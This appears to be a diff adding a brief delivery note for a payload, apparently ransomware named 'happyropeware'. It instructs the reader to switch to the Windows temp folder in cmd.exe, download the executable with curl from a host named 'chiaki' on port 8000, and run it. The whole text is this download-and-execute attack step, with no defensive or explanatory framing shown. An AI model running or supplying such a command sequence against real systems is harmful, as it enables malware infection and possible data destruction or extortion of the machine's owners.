@@ -1,0 +1,6 @@
+Deliver the payload by running
+cd %TEMP%
+curl -O http://chiaki:8000/target/release/happyropeware.exe
+happyropeware
+
+in cmd.exe
